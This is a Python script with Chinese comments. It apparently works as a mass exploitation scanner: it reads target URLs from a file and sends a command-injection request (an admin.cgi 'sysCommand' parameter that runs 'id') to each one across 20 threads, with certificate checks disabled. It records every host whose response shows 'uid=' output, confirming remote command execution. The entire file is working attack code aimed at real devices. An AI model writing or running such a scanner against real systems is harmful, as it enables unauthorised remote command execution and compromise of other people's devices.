import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# 禁用 urllib3 的不安全请求警告（针对自签名HTTPS证书）
from requests.packages import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置参数
INPUT_FILE = "ip.txt"  # 你的目标URL文件
OUTPUT_FILE = "success.txt"  # 成功的结果保存路径
TARGET_PATH = "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"
THREADS = 20  # 线程数，可根据网络情况调整
TIMEOUT = 5  # 请求超时时间（秒）
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def format_url(url):
    """规范化URL格式"""
    url = url.strip()
    if not url:
        return None
    # 如果没有协议头，默认加上 http://
    if not re.match(r"^https?://", url, re.IGNORECASE):
        url = "http://" + url
    # 移除末尾的斜杠，防止拼接时出现双斜杠 //
    return url.rstrip("/")


def check_url(base_url):
    """检测单个URL是否存在漏洞"""
    formatted_url = format_url(base_url)
    if not formatted_url:
        return None

    full_url = formatted_url + TARGET_PATH
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    try:
        # 发起GET请求，verify=False忽略SSL证书错误，allow_redirects=False防止重定向到登录页导致误报
        response = requests.get(
            full_url, headers=headers, timeout=TIMEOUT, proxies=proxies, verify=False, allow_redirects=False
        )

        # 核心判定逻辑：检查状态码是否为200，且内容中是否包含 Linux id 命令的特征（如 uid=）
        if response.status_code == 200 and "uid=" in response.text:
            print(f"[+] 漏洞存在 (Success): {formatted_url}")
            # 提取uid附近的一小段内容展示（可选）
            match = re.search(r"(uid=\d+\(.*?\))", response.text)
            cmd_res = match.group(1) if match else "成功执行但未匹配到完整uid"
            return formatted_url, cmd_res
        else:
            print(f"[-] 失败 (Failed): {formatted_url}")

    except requests.exceptions.RequestException as e:
        print(f"[!] 无法访问 (Error): {formatted_url} - 原因: {type(e).__name__}")

    return None


def main():
    if not os.path.exists(INPUT_FILE):
        print(f"[Error] 找不到输入文件: {INPUT_FILE}，请确保它在当前目录下。")
        return

    # 读取并解析所有URL
    with open(INPUT_FILE, "r", encoding="utf-8") as f:
        urls = [line.strip() for line in f if line.strip()]

    total_urls = len(urls)
    print(f"[*] 已加载 {total_urls} 个待测 URL，启动 {THREADS} 个线程进行检测...")

    success_count = 0

    # 使用线程池并发执行
    with open(OUTPUT_FILE, "w", encoding="utf-8") as out_f:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            # 提交所有任务到线程池
            future_to_url = {executor.submit(check_url, url): url for url in urls}

            # 迭代获取结果
            for future in as_completed(future_to_url):
                result = future.result()
                if result:
                    url, res_details = result
                    # 写入成功文件
                    out_f.write(f"{url} | 结果: {res_details}\n")
                    out_f.flush()  # 实时刷新写入
                    success_count += 1

    print("\n" + "=" * 30)
    print(f"[*] 检测完成！")
    print(f"[*] 总计检测: {total_urls} 个")
    print(f"[+] 成功获取结果: {success_count} 个")
    print(f"[*] 有效结果已保存至: {OUTPUT_FILE}")
    print("=" * 30)


if __name__ == "__main__":
    main()